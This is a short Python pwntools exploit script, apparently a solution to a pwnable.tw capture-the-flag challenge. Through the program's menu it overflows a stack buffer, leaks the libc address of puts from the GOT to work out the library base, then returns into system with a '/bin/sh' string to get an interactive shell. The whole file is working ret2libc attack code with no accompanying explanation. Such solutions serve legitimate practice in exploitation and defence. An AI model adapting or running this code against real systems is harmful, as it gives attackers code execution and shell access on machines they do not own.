#!/usr/bin/env python
from pwn import *
r = remote('chall.pwnable.tw',10103)

puts = 0x80484a4
main = 0x08048954
puts_got = 0x804afdc
puts_off = 0x005f140
system_off = 0x003a940 
sh_off = 0x158e8b


def create(des):
	r.sendafter('Your choice :','1\n')
	r.sendafter(':',des + '\n')
def power_up(des):
	r.sendafter('Your choice :','2\n')
	r.sendafter(':',des + '\n')
def beat():
	r.sendafter('Your choice :','3\n')
	sleep(1)

create('a'*47)
power_up('1')

pay1 = 'a'*7 + p32(puts) + p32(main) + p32(puts_got)
power_up(pay1)
beat()
beat()
print r.recvuntil('win !!\n')
base = u32(r.recv(4)) - puts_off
print "base: ",hex(base)

sh = base + sh_off
system = base + system_off


create('a'*47)
power_up('1')

pay2 = 'a'*7 + p32(system) + p32(main) + p32(sh)
power_up(pay2)
beat()
beat()

r.interactive()

"""
aaaabbbbccccddddeeee
   .ebp.eip
"""
